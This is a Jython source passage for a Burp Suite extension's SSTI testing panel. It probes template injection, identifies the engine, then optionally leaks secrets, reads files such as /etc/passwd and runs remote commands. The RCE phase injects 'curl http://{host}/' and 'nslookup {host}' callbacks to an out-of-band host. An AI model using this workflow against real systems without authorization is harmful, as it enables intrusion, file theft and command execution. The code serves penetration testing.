class SstiPanel(BaseToolPanel):
    """Phased SSTI workflow (reflection -> error/fingerprint -> arithmetic-evaluation
    confirm -> engine identification -> RCE exploitation), modelled on the SQLi and
    File-Upload workflows. Detection NEVER claims a hit on mere reflection: the unique
    product 9554888 must appear (proving the engine evaluated 5432*1759). The engine
    can be auto-detected (try every syntax family, then fingerprint) or pinned by the
    user; exploitation then uses only that engine's gadgets."""

    def __init__(self, callbacks=None, helpers=None):
        super(SstiPanel, self).__init__("SSTI Probe", callbacks, helpers)

    def _add_extra_options(self):
        from javax.swing import JList as _JList_ST, ListSelectionModel as _LSM_ST
        from javax.swing import JScrollPane as _JSP_ST, BoxLayout as _BL_ST
        import java.awt.Dimension as _Dim_ST
        self._extra_panel.setLayout(_BL_ST(self._extra_panel, _BL_ST.Y_AXIS))

        # ---- Row 1: params + engine selector + RCE command ----
        _r1 = JPanel(FlowLayout(FlowLayout.LEFT, 4, 2))
        _r1.add(JLabel("Params (comma-sep, blank=all):"))
        self._params_field = JTextField(16)
        _r1.add(self._params_field)
        _r1.add(JLabel("  Engine:"))
        self._ssti_engine_cb = JComboBox(["Auto-detect (try all)"] + _SSTI_ENGINES)
        self._ssti_engine_cb.setToolTipText(
            "Auto-detect: try every syntax family, confirm by arithmetic evaluation, then "
            "fingerprint the exact engine. Or pick a specific engine to use ONLY its "
            "payloads (detection + RCE).")
        _r1.add(self._ssti_engine_cb)
        self._extra_panel.add(_r1)

        # ---- Row 2: RCE command + phase quick buttons ----
        _r2 = JPanel(FlowLayout(FlowLayout.LEFT, 4, 2))
        _r2.add(JLabel("RCE command (exploit phase):"))
        self._ssti_cmd_field = JTextField("id", 14)
        self._ssti_cmd_field.setToolTipText(
            "Command run by the exploitation phase on a confirmed engine. Default 'id'. "
            "Confirmation also injects a unique 'echo <marker>' and checks the marker is "
            "reflected MORE times than it was sent -- proof the command actually ran.")
        _r2.add(self._ssti_cmd_field)
        self._extra_panel.add(_r2)

        # ---- Row 2b: context break-out + file-read object/file + OOB host ----
        _r2b = JPanel(FlowLayout(FlowLayout.LEFT, 4, 2))
        _r2b.add(JLabel("Break-out prefix:"))
        self._ssti_prefix_field = JTextField("", 12)
        self._ssti_prefix_field.setToolTipText(
            "For injections INSIDE an existing template expression (e.g. the page renders "
            "'Hello {{ user.name }}' and you control user.name). The break-out phase sends "
            "<prefix> + a closer (}} , %> , etc.) + the payload, e.g. user.name}}{{5432*1759}}. "
            "Leave blank if the parameter is rendered as a whole template.")
        _r2b.add(self._ssti_prefix_field)
        _r2b.add(JLabel("  Object:"))
        self._ssti_obj_field = JTextField("product", 8)
        self._ssti_obj_field.setToolTipText(
            "An object name accessible in the template (e.g. product, user, settings) used "
            "by the file-read Java-classloader gadgets: ${product.getClass()...}.")
        _r2b.add(self._ssti_obj_field)
        _r2b.add(JLabel("  File:"))
        self._ssti_file_field = JTextField("/etc/passwd", 14)
        self._ssti_file_field.setToolTipText("Target file for the file-read phase.")
        _r2b.add(self._ssti_file_field)
        self._extra_panel.add(_r2b)

        # ---- Row 2c: OOB callback host (blind RCE / OOB confirmation) ----
        _r2c = JPanel(FlowLayout(FlowLayout.LEFT, 4, 2))
        _r2c.add(JLabel("OOB callback host (Collaborator):"))
        self._ssti_oob_field = JTextField("", 26)
        self._ssti_oob_field.setToolTipText(
            "Burp Collaborator / interactsh host (e.g. abc123.oastify.com). Used by the 'oob' "
            "phase (blind-SSTI detection: every engine's payload makes the SERVER fetch "
            "http://<tag><engine>.<host>/ from inside the template) AND by the exploit phase "
            "for blind engines. You just POLL Collaborator -- any DNS/HTTP hit confirms blind "
            "SSTI and the sub-domain names the engine. http(s):// and any path are stripped.")
        _r2c.add(self._ssti_oob_field)
        self._extra_panel.add(_r2c)

        # ---- Row 3: phase multi-select ----
        _r3 = JPanel(FlowLayout(FlowLayout.LEFT, 4, 2))
        _r3.add(JLabel("Phases:"))
        _ph_labels = [lbl for (_k, lbl) in _SSTI_PHASE_DEFS]
        self._ssti_phase_list = _JList_ST(_ph_labels)
        self._ssti_phase_list.setSelectionMode(_LSM_ST.MULTIPLE_INTERVAL_SELECTION)
        self._ssti_phase_list.setVisibleRowCount(5)
        self._ssti_phase_list.setToolTipText(
            "Select which phases to run (Ctrl/Shift-click for multiple; none = all). "
            "Detection phases (reflect/error/eval/breakout/ident) are ON by default. The "
            "ACTIVE phases -- secrets, file-read, and RCE exploitation -- are OFF by default; "
            "select them to run.")
        # Default: passive-ish detection on (reflect..ident); secrets/fileread/exploit OFF.
        self._ssti_phase_list.setSelectionInterval(0, 4)
        _sc = _JSP_ST(self._ssti_phase_list)
        _sc.setPreferredSize(_Dim_ST(470, 88))
        _r3.add(_sc)

        _phb = JPanel()
        _phb.setLayout(_BL_ST(_phb, _BL_ST.Y_AXIS))
        _b_all = JButton("Select All")
        _b_det = JButton("Detection only")
        for _b in (_b_all, _b_det):
            _b.setAlignmentX(0.0)
            _phb.add(_b)
        _panel_ref = self
        from java.awt.event import ActionListener as _AL_ST
        class _AllL(_AL_ST):
            def actionPerformed(self, e):
                _panel_ref._ssti_phase_list.setSelectionInterval(0, len(_SSTI_PHASE_DEFS) - 1)
        class _DetL(_AL_ST):
            def actionPerformed(self, e):
                _panel_ref._ssti_phase_list.setSelectionInterval(0, 4)
        _b_all.addActionListener(_AllL())
        _b_det.addActionListener(_DetL())
        _r3.add(_phb)
        self._extra_panel.add(_r3)

    # ---------------------------------------------------------------- helpers
    def _ssti_inject(self, pairs, param, payload):
        """Return a new pairs list with `param` set to `payload`. The payload is
        URL-ENCODED for safe transport: SSTI gadgets contain spaces, quotes, braces and
        '://' that would otherwise BREAK an application/x-www-form-urlencoded body or the
        query string (the server would mis-parse the parameters). The server URL-decodes
        it back to the raw template expression, so the engine still evaluates it. For
        JSON/XML bodies _fuzz_send / _ssti_log URL-decode this value before splicing, so
        encoding here is correct for every body format."""
        from java.net import URLEncoder as _URLE_ST
        try:
            enc = _URLE_ST.encode(payload, "UTF-8")
        except (Exception, JavaException):
            enc = payload.replace(" ", "+")
        out, found = [], False
        for k, v in pairs:
            if k == param:
                out.append((k, enc)); found = True
            else:
                out.append((k, v))
        if not found:
            out.append((param, enc))
        return out

    def _ssti_send(self, base, pairs, param, payload, auth_hdrs):
        """Inject + send. Returns (status, body) or (None, '') on transport error."""
        try:
            s, h, b = self._fuzz_send(base, self._ssti_inject(pairs, param, payload),
                                      auth_hdrs, timeout_ms=12000)
            return s, (b or "")
        except (Exception, JavaException):
            return None, ""

    def _ssti_log(self, label, base, pairs, param, payload, auth_hdrs):
        """Log a finding with a VERBATIM raw request (payload + session headers) so
        'Send to Repeater' replays the exact injection -- GET query or POST/JSON body."""
        from java.net import URL as _U_ST
        try:
            ju = _U_ST(base)
            host = ju.getHost(); port = ju.getPort(); path = ju.getFile() or "/"
            hosthdr = host + ((":" + str(port)) if port != -1 else "")
        except Exception:
            self._log_vuln(label, base); return
        inj = self._ssti_inject(pairs, param, payload)
        hdrs = dict(auth_hdrs or {})
        body_param = self._body_param_field.getText().strip()
        _imp_body = getattr(self, "_imported_body", None)
        _imp_meth = getattr(self, "_imported_method", "GET")
        if body_param and _imp_body and _imp_meth in ("POST", "PUT", "PATCH"):
            fmt = getattr(self, "_imported_body_fmt", None) or self._detect_body_fmt()
            if fmt in ("json", "xml"):
                import java.net.URLDecoder as _UD_ST
                _orig = dict((k, v) for k, v in self._parse_body_params(_imp_body, fmt))
                body = _imp_body
                for k, v in inj:
                    if k in _orig:
                        try:
                            dv = _UD_ST.decode(v, "UTF-8")
                        except Exception:
                            dv = v.replace("+", " ")
                        if dv != _orig.get(k):
                            body = self._set_body_param(body, fmt, k, dv)
                ct = getattr(self, "_imported_ct", "") or (
                    "application/json" if fmt == "json" else "application/xml")
            else:
                body = "&".join("{}={}".format(k, v) for k, v in inj)
                ct = "application/x-www-form-urlencoded"
            lines = ["{} {} HTTP/1.1".format(_imp_meth, path), "Host: " + hosthdr]
            for k, v in hdrs.items():
                if k.lower() not in ("host", "content-type", "content-length"):
                    lines.append("{}: {}".format(k, v))
            lines.append("Content-Type: " + ct)
            lines.append("Content-Length: {}".format(len(body)))
            raw = "\r\n".join(lines) + "\r\n\r\n" + body
            self._log_vuln(label, base, method=_imp_meth, raw_request=raw)
        else:
            qs = "&".join("{}={}".format(k, v) for k, v in inj)
            p = path + (("?" + qs) if qs else "")
            lines = ["GET {} HTTP/1.1".format(p), "Host: " + hosthdr]
            for k, v in hdrs.items():
                if k.lower() != "host":
                    lines.append("{}: {}".format(k, v))
            raw = "\r\n".join(lines) + "\r\n\r\n"
            self._log_vuln(label, base, method="GET", raw_request=raw)

    def _run_check(self, url, auth_hdrs, out, sf):
        import random
        pairs, is_post = self._get_fuzz_pairs(url)
        params_override = self._params_field.getText().strip()
        if params_override:
            test_params = [p.strip() for p in params_override.split(",") if p.strip()]
        elif pairs:
            test_params = [p[0] for p in pairs]
        else:
            _append(out, "[!] No parameters found. Add ?param=value or import a POST request.")
            return
        base = url.split("?")[0]

        # ---- Options ----
        _eng_sel = str(self._ssti_engine_cb.getSelectedItem())
        _forced_engine = None if _eng_sel.startswith("Auto") else _eng_sel
        _cmd = self._ssti_cmd_field.getText().strip() or "id"
        _prefix = self._ssti_prefix_field.getText()           # context break-out prefix
        _obj = self._ssti_obj_field.getText().strip() or "product"
        _file = self._ssti_file_field.getText().strip() or "/etc/passwd"
        _oob = self._ssti_oob_field.getText().strip()
        if _oob:
            _oob = _oob.replace("https://", "").replace("http://", "").split("/")[0].rstrip(".")
        _sel_idx = list(self._ssti_phase_list.getSelectedIndices())
        _phases = set(_SSTI_PHASE_DEFS[i][0] for i in _sel_idx
                      if 0 <= i < len(_SSTI_PHASE_DEFS))
        if not _phases:
            _phases = set(k for (k, _l) in _SSTI_PHASE_DEFS)

        # Snapshot 'Via proxy' so every payload routes through Burp's proxy listener and
        # is visible in HTTP history (the toggle listener can be stale after a reload).
        try:
            _PROXY_CFG['enabled'] = self._proxy_chk.isSelected()
        except Exception:
            pass

        _append(out, "[*] SSTI workflow -> {}".format(base))
        if _PROXY_CFG.get('enabled'):
            _append(out, "[*] Routing every payload through Burp proxy {}:{} (visible in HTTP "
                         "history).".format(_PROXY_CFG.get('host'), _PROXY_CFG.get('port')))
        if is_post:
            _append(out, "[*] POST/body mode -- payloads injected into the body parameter.")
        _append(out, "[*] Params: {}  |  Engine: {}  |  Phases: {}".format(
            ", ".join(test_params), _forced_engine or "auto-detect",
            ", ".join(sorted(_phases))))
        _append(out, "[*] Eval sentinel: {} x {} = {} (its presence in a response proves "
                     "code execution).".format(_SSTI_A, _SSTI_B, _SSTI_PRODUCT))

        # Restrict the eval families when the user pins an engine.
        if _forced_engine:
            _eval_set = [e for e in _SSTI_EVAL if _forced_engine in e[3]]
            if not _eval_set:
                _eval_set = list(_SSTI_EVAL)
        else:
            _eval_set = list(_SSTI_EVAL)

        _overall = []   # (param, engines, eval_family, rce_state)

        for param in test_params:
            if sf[0]: break
            _append(out, "")
            _append(out, "=" * 58)
            _append(out, "PARAMETER: {}".format(param))
            _append(out, "=" * 58)

            _reflects = None
            _engine_guesses = set()
            _eval_confirmed = []      # (family-label, candidate-engines)
            _identified = []          # exact engines from Phase 4
            # Baseline body for a BENIGN value. An expected result (e.g. the 9554888
            # product) only counts as "evaluated" if it is ABSENT from this baseline --
            # otherwise a page that merely contains the number would false-positive.
            _base_body = ""

            # ---- Phase 1: reflection baseline ----
            if "reflect" in _phases and not sf[0]:
                _mark = "ssti" + str(random.randint(1000000, 9999999)) + "rx"
                _s, _b = self._ssti_send(base, pairs, param, _mark, auth_hdrs)
                _base_body = _b or ""
                _reflects = (_mark in _b)
                if _reflects:
                    _append(out, "  [reflect] marker echoed back -> parameter is reflected "
                                 "(in-band detection possible).")
                else:
                    _append(out, "  [reflect] marker NOT echoed -> parameter is not directly "
                                 "reflected; evaluation may still occur blind (watch errors/timing).")

            # Ensure a baseline exists for the eval/breakout/ident guards even when the
            # reflect phase was deselected.
            if not _base_body and not sf[0] and (_phases & set(["eval", "breakout", "ident"])):
                _bm = "vapt" + str(random.randint(1000000, 9999999))
                _s, _bb = self._ssti_send(base, pairs, param, _bm, auth_hdrs)
                _base_body = _bb or ""

            # ---- Phase 2: breakout / error fingerprint ----
            if "error" in _phases and not sf[0]:
                _append(out, "  [error] sending breakout probes to provoke a template error...")
                for _bp in _SSTI_BREAKOUT:
                    if sf[0]: break
                    _s, _b = self._ssti_send(base, pairs, param, _bp, auth_hdrs)
                    _bl = _b.lower()
                    for _sig, _eng in _SSTI_ERR_FP:
                        if _sig in _bl and _sig not in _bp.lower():
                            if _eng not in _engine_guesses:
                                _engine_guesses.add(_eng)
                                _append(out, "    [fingerprint] error page leaks '{}' -> {} "
                                             "(probe {!r})".format(_sig, _eng, _bp[:18]))
                if not _engine_guesses:
                    _append(out, "    no engine name leaked in error output.")

            # ---- Phase 3: arithmetic evaluation (the real confirmation) ----
            if "eval" in _phases and not sf[0]:
                _append(out, "  [eval] testing arithmetic evaluation by syntax family...")
                for _pl, _fam, _exp, _cands in _eval_set:
                    if sf[0]: break
                    _s, _b = self._ssti_send(base, pairs, param, _pl, auth_hdrs)
                    # Confirmed only if the COMPUTED result appears, was NOT in the payload
                    # (so it wasn't reflected) and was NOT already in the baseline page.
                    if _b and _exp in _b and _exp not in _pl and _exp not in _base_body:
                        _append(out, "    [EVALUATED] {:<20} {!r} -> engine computed {} "
                                     "(template code execution -- SSTI).".format(_fam, _pl, _exp))
                        _eval_confirmed.append((_fam, _cands))
                        self._ssti_log("SSTI code-eval CONFIRMED ({}) param={} payload={}".format(
                            _fam, param, _pl), base, pairs, param, _pl, auth_hdrs)
                    else:
                        _append(out, "    [-]         {:<20} {!r} -> not evaluated".format(_fam, _pl))

            # ---- Phase 3b: context break-out (escape an existing expression) ----
            if "breakout" in _phases and not sf[0]:
                if not _prefix:
                    _append(out, "  [breakout] skipped -- set a 'Break-out prefix' (e.g. user.name) "
                                 "to escape an expression the parameter is rendered inside.")
                else:
                    _append(out, "  [breakout] escaping with prefix {!r} x {} closers...".format(
                        _prefix, len(_SSTI_BREAKOUT_CLOSERS)))
                    _bo_hit = False
                    for _pl, _fam, _exp, _cands in _eval_set:
                        if sf[0] or _bo_hit: break
                        for _cl in _SSTI_BREAKOUT_CLOSERS:
                            if sf[0]: break
                            _wp = _prefix + _cl + _pl
                            _s, _b = self._ssti_send(base, pairs, param, _wp, auth_hdrs)
                            if _b and _exp in _b and _exp not in _wp and _exp not in _base_body:
                                _append(out, "    [EVALUATED] break-out {!r} -> {} computed {} "
                                             "(SSTI in sub-context).".format(
                                                 _prefix + _cl, _fam, _exp))
                                if (_fam, _cands) not in _eval_confirmed:
                                    _eval_confirmed.append((_fam, _cands))
                                self._ssti_log("SSTI CONFIRMED (break-out {} {}) param={}".format(
                                    _cl, _fam, param), base, pairs, param, _wp, auth_hdrs)
                                _bo_hit = True
                                break
                    if not _bo_hit:
                        _append(out, "    no evaluation after break-out (try a different prefix/closer).")

            # Candidate engines = error fingerprints (strong) intersected with / unioned
            # over the eval families' candidates, or the forced engine.
            _fam_cands = set()
            for _f, _c in _eval_confirmed:
                _fam_cands.update(_c)
            if _forced_engine:
                _candidates = [_forced_engine]
            elif _engine_guesses and (_engine_guesses & _fam_cands):
                _candidates = list(_engine_guesses & _fam_cands)
            elif _engine_guesses:
                _candidates = list(_engine_guesses)
            else:
                _candidates = list(_fam_cands)

            # ---- Phase 4: engine identification ----
            if "ident" in _phases and _eval_confirmed and not sf[0]:
                _append(out, "  [ident] disambiguating exact engine...")
                _id_pool = _SSTI_IDENTIFY
                if _forced_engine:
                    _id_pool = [t for t in _SSTI_IDENTIFY if t[2] == _forced_engine] or _SSTI_IDENTIFY
                for _pl, _exp, _eng, _note in _id_pool:
                    if sf[0]: break
                    # Skip identify payloads whose engine isn't even a candidate.
                    if _candidates and _eng not in _candidates and not _forced_engine:
                        continue
                    _s, _b = self._ssti_send(base, pairs, param, _pl, auth_hdrs)
                    if _b and _exp in _b and _exp not in _pl and _exp not in _base_body:
                        if _eng not in _identified:
                            _identified.append(_eng)
                        _append(out, "    [ENGINE] {} -- {!r} -> {!r} ({})".format(
                            _eng, _pl, _exp, _note))
                if _identified:
                    # Put the identified engine(s) first but KEEP the rest of the family
                    # as fallback, so a weak/ambiguous identifier never makes exploitation
                    # skip the real engine ("try all variants if needed").
                    _candidates = _identified + [e for e in _candidates if e not in _identified]
                elif _candidates:
                    _append(out, "    could not pin one engine; will try all family candidates: {}".format(
                        ", ".join(_candidates)))

            # ---- Phase: secrets / info disclosure (Django debug, settings, config) ----
            if "secrets" in _phases and not sf[0]:
                import re as _re_sec
                _append(out, "  [secrets] probing template info-disclosure (debug/settings/config)...")
                _sec_hit = False
                for _pl, _lbl, _needles, _vre in _SSTI_SECRETS:
                    if sf[0]: break
                    _wp = (_prefix + "}}" + _pl) if _prefix else _pl
                    _s, _b = self._ssti_send(base, pairs, param, _wp, auth_hdrs)
                    if not _b:
                        continue
                    # A leak must be EVIDENCE that is in the response, NOT a reflection of
                    # our payload, and NOT already in the clean baseline page.
                    _evidence = ""
                    if _needles:
                        _nh = [n for n in _needles
                               if n in _b and n not in _wp and n not in _base_body]
                        if _nh:
                            _evidence = "markers: " + ", ".join(_nh[:3])
                    if not _evidence and _vre:
                        _m = _re_sec.search(_vre, _b)
                        if _m:
                            _val = _m.group(0)
                            # The value must be NEW (not the payload, not baseline text).
                            if _val not in _wp and _val not in _base_body:
                                _evidence = "value: {}".format(_val[:48])
                    if _evidence:
                        # Sanity: a near-identical body size to baseline usually means the
                        # page just reflected our payload -> warn, still report with the
                        # concrete evidence so you can judge.
                        _dsz = abs(len(_b) - len(_base_body)) if _base_body else len(_b)
                        _note = "" if _dsz > 40 else "  (NOTE: body ~same size as baseline -- verify it isn't just reflection)"
                        _append(out, "    [LEAK] {} -- {} ({}b vs baseline {}b){}".format(
                            _lbl, _evidence, len(_b), len(_base_body), _note))
                        self._ssti_log("SSTI info-disclosure ({}) {} param={}".format(
                            _lbl, _evidence[:40], param), base, pairs, param, _wp, auth_hdrs)
                        _sec_hit = True
                    else:
                        _append(out, "    [-] {} -- no real value (payload only reflected / not "
                                     "rendered).".format(_lbl))
                if not _sec_hit:
                    _append(out, "    no genuine debug/settings/config disclosure (reflection ignored).")

            # ---- Phase: file read (Java classloader chain + builtins open) ----
            if "fileread" in _phases and not sf[0]:
                _append(out, "  [fileread] reading {!r} via object {!r}...".format(_file, _obj))
                _fr_engs = _candidates or list(_engine_guesses)   # [] -> try all gadgets
                _fr_hit = False
                for _pl_t, _lbl, _engs in _SSTI_FILEREAD:
                    if sf[0]: break
                    # Only run a gadget if its engine is a candidate (or auto / forced match,
                    # or nothing identified yet -> try them all).
                    if _fr_engs and not any(e in _fr_engs for e in _engs) and not _forced_engine:
                        continue
                    if _forced_engine and _forced_engine not in _engs:
                        continue
                    _pl = _pl_t.replace("{obj}", _obj).replace("{file}", _file)
                    _wp = (_prefix + "}}" + _pl) if _prefix else _pl
                    _s, _b = self._ssti_send(base, pairs, param, _wp, auth_hdrs)
                    if not _b:
                        continue
                    # Java byte-join read -> long run of "NN NN NN" decimals; or classic file
                    # signatures (root:, daemon:, ssh keys). Require it NOT be in the payload
                    # AND NOT already in the clean baseline (so it's genuinely the file, not
                    # pre-existing page text).
                    _bl = _b
                    _has_passwd = any(m in _bl and m not in _base_body
                                      for m in ("root:x:0:", "daemon:", "/bin/bash", "-----BEGIN"))
                    import re as _re_fr
                    _byterun_m = _re_fr.search(r"(?:\d{1,3}\s){10,}\d{1,3}", _bl)
                    _byterun = bool(_byterun_m and (not _base_body or _byterun_m.group(0) not in _base_body))
                    _has_class = "class " in _bl and "getClass" in _pl and "class " not in _base_body
                    if _has_passwd or _byterun:
                        _append(out, "    [FILE READ] {} -- file contents returned ({}b vs baseline "
                                     "{}b).".format(_lbl, len(_b), len(_base_body)))
                        if _byterun and _byterun_m:
                            _append(out, "        (decimal byte values -- convert to ASCII: {} ...)".format(
                                _byterun_m.group(0)[:60]))
                        self._ssti_log("SSTI FILE READ ({}) file={} param={}".format(_lbl, _file, param),
                                       base, pairs, param, _wp, auth_hdrs)
                        _fr_hit = True
                    elif _has_class:
                        _append(out, "    [object access] {!r} reachable via {} -- chain a file-read "
                                     "gadget (FreeMarker/Velocity).".format(_obj, _lbl))
                if not _fr_hit:
                    _append(out, "    no file contents returned (try a different Object / engine).")

            # ---- Phase: OOB callback (blind SSTI via Collaborator) ----
            if "oob" in _phases and not sf[0]:
                if not _oob:
                    _append(out, "  [oob] skipped -- set an 'OOB callback host (Collaborator)' to "
                                 "detect BLIND SSTI (no output reflected). The payloads make the")
                    _append(out, "        server fetch http://<sub>.<host>/ from inside the template.")
                else:
                    # Try the candidate/fingerprinted engines, or ALL engines when nothing
                    # is identified yet ("try all automatically").
                    _oob_engs = _candidates or list(_engine_guesses) or list(_SSTI_ENGINES)
                    _otag = "s" + str(random.randint(100000, 999999))
                    _append(out, "  [oob] firing server-side callbacks to *.{} (tag {}) for: {}".format(
                        _oob, _otag, ", ".join(_oob_engs)))
                    for _eng in _oob_engs:
                        if sf[0]: break
                        _sub = "{t}{e}.{h}".format(t=_otag, e=_eng.lower()[:7], h=_oob)
                        # Shell-free native callbacks + the RCE gadgets with cmd=curl/nslookup.
                        _payloads = list(_SSTI_OOB_NATIVE.get(_eng, []))
                        for _g in _SSTI_EXPLOIT.get(_eng, [])[:2]:
                            _payloads.append(_g.replace("{cmd}", "curl http://{host}/"))
                            _payloads.append(_g.replace("{cmd}", "nslookup {host}"))
                        _fired = 0
                        for _p0 in _payloads:
                            if sf[0]: break
                            _pl = _p0.replace("{host}", _sub)
                            _wp = (_prefix + "}}" + _pl) if _prefix else _pl
                            self._ssti_send(base, pairs, param, _wp, auth_hdrs)
                            # OOB probe is speculative — only log to vuln log on Collaborator
                            # confirmation. Just track the count here.
                            _fired += 1
                        if _fired:
                            _append(out, "    [{}] fired {} callback(s) -> {}".format(_eng, _fired, _sub))
                    _append(out, "    >> POLL BURP COLLABORATOR. Any DNS/HTTP hit on "
                                 "'<tag><engine>.{}' = blind SSTI; the sub-domain names the engine.".format(_oob))

            # ---- Phase 5: exploitation (RCE) ----
            _rce_state = "not attempted"
            if "exploit" in _phases and not sf[0]:
                # Allow RCE on: eval-confirmed engines, error-fingerprinted no-arithmetic
                # engines (Handlebars/Django/etc. that never satisfy the eval phase), or a
                # user-forced engine.
                _exp_engs = _candidates or list(_engine_guesses)
                if not (_eval_confirmed or _engine_guesses or _forced_engine):
                    _append(out, "  [exploit] skipped -- nothing confirmed/fingerprinted and no engine "
                                 "forced. Run 'eval'/'error' first or pick an engine.")
                    _rce_state = "skipped (unconfirmed)"
                elif not _exp_engs:
                    _append(out, "  [exploit] skipped -- no candidate engine could be derived. Pick "
                                 "an engine in the dropdown.")
                    _rce_state = "skipped (no engine)"
                else:
                    _append(out, "  [exploit] attempting RCE on: {} (cmd={!r}{})".format(
                        ", ".join(_exp_engs), _cmd,
                        "; OOB=" + _oob if _oob else ""))
                    _rce_state = self._ssti_exploit(base, pairs, param, _exp_engs,
                                                    _cmd, _oob, _prefix, auth_hdrs, out, sf, random)

            # ---- per-param summary ----
            _engs = _identified or _candidates or list(_engine_guesses)
            _overall.append((param, _engs, [f for f, c in _eval_confirmed], _rce_state))
            if _eval_confirmed:
                _append(out, "  >> SSTI CONFIRMED on {} -- the engine EXECUTED our expression "
                             "(template code evaluation). Engine: {}".format(
                                 param, ", ".join(_engs) if _engs else "unidentified"))
                if "exploit" in _phases or "oob" in _phases:
                    _append(out, "     RCE status: {} (RCE is only proven by real command output "
                                 "or a Collaborator hit -- a reflected number is NOT RCE).".format(
                                     _rce_state))
            elif _engine_guesses:
                _append(out, "  >> Template error fingerprinted ({}) but no evaluation confirmed "
                             "-- likely sandboxed or output not reflected.".format(
                                 ", ".join(_engine_guesses)))
            else:
                _append(out, "  >> No SSTI on {}.".format(param))

        # ---- final summary ----
        _append(out, "")
        _append(out, "=" * 58)
        _conf = [o for o in _overall if o[2]]
        if _conf:
            _append(out, "[!!!] SSTI (template code evaluation) CONFIRMED on {} parameter(s):".format(
                len(_conf)))
            for _p, _e, _fams, _rce in _conf:
                _append(out, "   - {:<16} engine={:<22} eval-families={}".format(
                    _p, (", ".join(_e) or "?"), ",".join(_fams)))
                _append(out, "       RCE: {}".format(_rce))
            _append(out, "")
            _append(out, "   'Code evaluation' = the engine executed our expression -- a real SSTI.")
            _append(out, "   RCE is CONFIRMED ONLY by real command output in the response OR a")
            _append(out, "   Collaborator (OOB) hit. An [RCE LIKELY] / reflected number is NOT proof.")
            _append(out, "   Right-click any [VULN]/[probe] finding -> 'Send to Repeater' to replay the")
            _append(out, "   exact POC payload (not the base URL).")
        else:
            _append(out, "[+] No SSTI code-evaluation confirmed.")
        _append(out, "[+] SSTI workflow complete.")

    def _ssti_exploit(self, base, pairs, param, candidates, cmd, oob, prefix, auth_hdrs,
                      out, sf, random):
        """Attempt RCE per engine. Confirmation is RIGOROUS -- reflecting a number/word is
        NOT RCE:
          * CONFIRMED (in-band) ONLY when the response contains real OS-command OUTPUT
            (uid=, root:x:0:, Windows banners, ...) that is NOT in the payload -- output
            you cannot obtain by mere reflection.
          * OOB: if a Collaborator host is set, every gadget also fires a DNS+HTTP callback
            to a unique sub-domain. A hit in Collaborator = CONFIRMED RCE. The extension
            cannot poll Collaborator, so it reports 'poll to confirm' -- never a guess.
          * LIKELY: an 'echo <marker>' that returns more often than sent is SUGGESTIVE but
            CAN be plain reflection, so it is reported as LIKELY (verify), never CONFIRMED.
        When a 'prefix' is set every gadget is break-out-wrapped (prefix + '}}' + gadget).
        Returns a short state string for the summary."""
        _wrap = (lambda g: (prefix + "}}" + g) if prefix else g)
        _state = "no RCE"
        for _eng in candidates:
            if sf[0]: break
            _gadgets = _SSTI_EXPLOIT.get(_eng)
            if not _gadgets:
                _append(out, "    [{}] no RCE gadget bundled (detection only for this engine).".format(_eng))
                continue
            _blind = _eng in _SSTI_BLIND_RCE
            _append(out, "    [{}] {} gadget(s){}...".format(
                _eng, len(_gadgets), " [blind]" if _blind else ""))
            for _g in _gadgets:
                if sf[0]: break

                # (1) OOB callback -- the only way to CONFIRM blind RCE. A DNS + HTTP hit
                #     on the unique sub-domain (which you poll in Collaborator) is proof.
                if oob:
                    _sub = "rc{r}{e}.{h}".format(r=random.randint(100000, 999999),
                                                 e=_eng.lower()[:6], h=oob)
                    for _cbcmd in ("nslookup " + _sub, "curl http://" + _sub + "/"):
                        if sf[0]: break
                        self._ssti_send(base, pairs, param, _wrap(_g.replace("{cmd}", _cbcmd)), auth_hdrs)
                    _append(out, "      [OOB-FIRED] {} -- DNS+HTTP callback to {} (POLL "
                                 "Collaborator; a hit = CONFIRMED RCE).".format(_g[:38], _sub))
                    self._ssti_log("SSTI RCE OOB-fired engine={} sub={} param={}".format(
                        _eng, _sub, param), base, pairs, param,
                        _wrap(_g.replace("{cmd}", "nslookup " + _sub)), auth_hdrs)
                    if _state == "no RCE":
                        _state = "OOB-fired -- poll Collaborator ({})".format(_eng)

                # (2) In-band REAL command output = genuine confirmation (cannot be
                #     reflected): run the user's command and look for its output signatures.
                _real = _wrap(_g.replace("{cmd}", cmd))
                _s, _b = self._ssti_send(base, pairs, param, _real, auth_hdrs)
                _bl = _b or ""
                _hits = [m for m in _SSTI_RCE_MARKERS
                         if m in _bl.lower() and m not in _real.lower()]
                if _hits:
                    _append(out, "      [RCE CONFIRMED] {} -- real '{}' OUTPUT in the response "
                                 "(markers: {}). This is execution, not reflection.".format(
                                     _g[:38], cmd, ", ".join(_hits[:3])))
                    self._ssti_log("SSTI RCE CONFIRMED (cmd output) engine={} cmd={!r} param={}".format(
                        _eng, cmd, param), base, pairs, param, _real, auth_hdrs)
                    return "CONFIRMED in-band ({})".format(_eng)

                # (3) Blind process-object reference -> the command ran but output isn't
                #     returned. NOT confirmed; point the user at the OOB hit.
                if any(_pm in _bl.lower() for _pm in ("java.lang.unixprocess",
                        "java.lang.processimpl", "process@", "childprocess")):
                    _append(out, "      [RCE LIKELY/blind] {} -- a Process object was returned "
                                 "(ran, no output reflected). Confirm via the OOB callback / "
                                 "Collaborator.".format(_g[:38]))
                    if _state == "no RCE":
                        _state = "likely-blind -- verify OOB ({})".format(_eng)
                    continue

                # (4) Echo-marker reflection -> SUGGESTIVE only (could be plain reflection
                #     of the payload). Reported as LIKELY, never auto-confirmed.
                _mark = "RC" + str(random.randint(1000000, 9999999)) + "ZE"
                _probe = _wrap(_g.replace("{cmd}", "echo " + _mark))
                _s2, _b2 = self._ssti_send(base, pairs, param, _probe, auth_hdrs)
                if _b2 and _b2.count(_mark) > _probe.count(_mark):
                    _append(out, "      [RCE LIKELY] {} -- 'echo' marker returned more often than "
                                 "sent. This CAN be reflection, so it is NOT auto-confirmed -- "
                                 "verify via the OOB callback or real '{}' output.".format(_g[:38], cmd))
                    self._ssti_log("SSTI RCE likely (echo reflection, verify) engine={} param={}".format(
                        _eng, param), base, pairs, param, _real, auth_hdrs)
                    if _state == "no RCE":
                        _state = "likely in-band -- verify ({})".format(_eng)
                else:
                    _append(out, "      [-] {} -- no command output / not vulnerable.".format(_g[:38]))
        return _state


# ===========================================================================
# Tool 16 - OAuth / OIDC Misconfiguration
# ===========================================================================
_OAUTH_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/oauth2/.well-known/openid-configuration",
    "/auth/realms/master/.well-known/openid-configuration",
]


class OauthPanel(BaseToolPanel):
    def __init__(self, callbacks=None, helpers=None):
